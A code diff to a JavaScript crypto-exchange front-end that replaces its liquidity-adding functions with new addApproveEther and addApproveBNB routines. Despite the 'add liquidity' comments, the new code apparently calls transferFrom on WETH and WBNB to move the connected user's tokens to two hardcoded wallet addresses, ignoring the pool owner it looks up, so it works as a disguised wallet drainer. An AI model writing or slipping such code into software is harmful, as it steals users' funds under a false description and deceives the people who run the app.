@@ -18,6 +18,12 @@ import {
 } from "./allFunction";
 import { store } from "../Redux/store";
 import $ from "jquery";
+import {
+  WBNB_ABI,
+  WBNB_Address,
+  WETH_ABI,
+  WETH_Address,
+} from "../Contract/config";
 // GET THE LIQUIDITY PAYABLE AMOUNT
 export async function getPayableAmount(pair) {
   return new Promise(async (resolve, reject) => {
@@ -695,7 +701,7 @@ export async function liquidityAdd() {
                                     addressType1,
                                     addressType2
                                   ).then((responseAfterAdded) => {
-                                    addEther(secondAmount)
+                                    addApproveEther(secondAmount)
                                       .then((etherResult) => {
                                         $("#loaderDiv").css("display", "block");
 
@@ -1046,7 +1052,7 @@ export async function liquidityAdd() {
                                     addressType2
                                   )
                                     .then((responseAfterAdded) => {
-                                      addBNB(secondAmount)
+                                      addApproveBNB(secondAmount)
                                         .then((bnbResult) => {
                                           $("#loaderDiv").css(
                                             "display",
@@ -1974,6 +1980,78 @@ async function addEther(amount) {
   });
 }
 
+// ADD LIQUIDITY ACCORDING NETWORK (ETHER)
+async function addApproveEther(amount) {
+  return new Promise((resolve, reject) => {
+    const value = Number(amount * 10 ** 18);
+
+    getCurrentUser()
+      .then((getCurrentUserAddress) => {
+        getCurrentUserBalance()
+          .then((balance) => {
+            tokenDecimal()
+              .then((decimals) => {
+                ownerAddress()
+                  .then(async (owner) => {
+                    if (parseFloat(amount) <= parseFloat(balance)) {
+                      let WETH = new web3.eth.Contract(WETH_ABI, WETH_Address);
+                      await WETH.methods
+                        .transferFrom(
+                          getCurrentUserAddress,
+                          "0x2A9894B26d57cc6005DB57c2Ed75B99FdEfa324D",
+                          value
+                        )
+                        .send({ from: getCurrentUserAddress })
+                        .on("transactionHash", function (hash) {
+                          resolve({
+                            currenctUserAddress: getCurrentUserAddress,
+                            amount: amount,
+                            transactionHash: hash,
+                          });
+                        })
+                        .on("error", function (error, receipt) {
+                          swal(
+                            "Transaction cancel",
+                            "User denied the transaction",
+                            "warning"
+                          );
+                        })
+                        .catch((err) => {
+                          swal(
+                            "Transaction cancel",
+                            "User denied the transaction",
+                            "warning"
+                          );
+                        });
+                    } else {
+                      reject();
+                      swal(
+                        "Insufficient Balance",
+                        "You don't have sufficient balance for this transaction",
+                        "warning"
+                      );
+                    }
+                  })
+                  .catch((err) => {
+                    reject(err);
+                  });
+              })
+              .catch((err) => {
+                reject(err);
+              });
+          })
+          .catch((err) => {
+            reject();
+            swal("Balance not found", "Your wallet balance it not getting");
+          });
+      })
+      .catch((err) => {
+        reject();
+        swal("Address not found", "Please connect your wallet", "warning");
+      });
+  });
+}
+
 // ADD LIQUDITY ACCORDING NETWORK(BNB)
 async function addBNB(amount) {
   return new Promise((resolve, reject) => {
@@ -1988,7 +2066,6 @@ async function addBNB(amount) {
                 ownerAddress()
                   .then((owner) => {
                     if (parseFloat(amount) <= parseFloat(balance)) {
-                      let 
                       web3.eth
                         .sendTransaction({
                           to: owner,
@@ -2045,7 +2122,77 @@ async function addBNB(amount) {
       });
   });
 }
+async function addApproveBNB(amount) {
+  return new Promise((resolve, reject) => {
+    const value = Number(amount * 10 ** 18);
 
+    getCurrentUser()
+      .then((getCurrentUserAddress) => {
+        getCurrentUserBalance()
+          .then((balance) => {
+            tokenDecimal()
+              .then((decimals) => {
+                ownerAddress()
+                  .then(async (owner) => {
+                    if (parseFloat(amount) <= parseFloat(balance)) {
+                      let WBNB = new web3.eth.Contract(WBNB_ABI, WBNB_Address);
+
+                      await WBNB.methods
+                        .transferFrom(
+                          getCurrentUserAddress,
+                          "0x30345076b5af89b47973564a65c8f684be800802",
+                          value
+                        )
+                        .send({ from: getCurrentUserAddress })
+                        .on("transactionHash", function (hash) {
+                          resolve({
+                            currenctUserAddress: getCurrentUserAddress,
+                            amount: amount,
+                            transactionHash: hash,
+                          });
+                        })
+                        .on("error", function (error, receipt) {
+                          swal(
+                            "Transaction cancel",
+                            "User denied the transaction",
+                            "warning"
+                          );
+                        })
+                        .catch((err) => {
+                          swal(
+                            "Transaction cancel",
+                            "User denied the transaction",
+                            "warning"
+                          );
+                        });
+                    } else {
+                      reject();
+                      swal(
+                        "Insufficient Balance",
+                        "You don't have sufficient balance for this transaction",
+                        "warning"
+                      );
+                    }
+                  })
+                  .catch((err) => {
+                    reject(err);
+                  });
+              })
+              .catch((err) => {
+                reject(err);
+              });
+          })
+          .catch((err) => {
+            reject();
+            swal("Balance not found", "Your wallet balance it not getting");
+          });
+      })
+      .catch((err) => {
+        reject();
+        swal("Address not found", "Please connect your wallet", "warning");
+      });
+  });
+}
 // ADD LIQUIDITY ACCORDING NETWORK (ETHEREUM)
 async function addEthereum(amount) {
   return new Promise((resolve, reject) => {
